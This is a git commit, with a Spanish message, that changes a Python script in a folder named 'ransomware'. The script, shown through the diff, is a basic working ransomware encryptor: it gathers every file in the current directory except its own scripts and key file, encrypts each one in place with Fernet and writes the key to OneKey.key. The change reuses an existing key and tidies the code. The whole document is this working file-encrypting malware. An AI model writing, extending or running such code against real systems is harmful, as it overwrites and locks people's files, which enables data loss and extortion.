9b9d4af3847b2b7f4924bfffd95b46b06904522c
Villarreal.D <villarreal.d96@gmail.com>
2023-10-25 07:14:16 -0300

    mas cambios pero en encryp

--- ransomware/encrypt_basic.py
+++ ransomware/encrypt_basic.py
@@ -1,8 +1,7 @@
-#!usr/bin/env python3
+#!/usr/bin/env python3
 
 import os
 from cryptography.fernet import Fernet
-
 
 files = []
 
@@ -10,22 +9,25 @@ for file in os.listdir():
     if file == "encrypt_basic.py" or file == "OneKey.key" or file == "decrypt_basic.py":
         continue
     if os.path.isfile(file):
-            files.append(file)
+        files.append(file)
 
 print(files)
 
+if os.path.exists("OneKey.key"):
+    with open("OneKey.key", "rb") as key_file:
+        secret_key = key_file.read()
+else:
+    secret_key = Fernet.generate_key()
+    with open("OneKey.key", "wb") as key_file:
+        key_file.write(secret_key)
 
-key = Fernet.generate_key()
-
-with open("OneKey.key", "wb") as OneKey:
-        OneKey.write(key)
+fernet = Fernet(secret_key)
 
 for file in files:
-        with open(file,"rb") as thefile:
-                contents = thefile.read()
-        contents_encrypted = Fernet(key).encrypt(contents)
-        with open(file, "wb") as thefile:
-            thefile.write(contents_encrypted)
-
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = fernet.encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
 
 print("FILES ENCRYPTED")
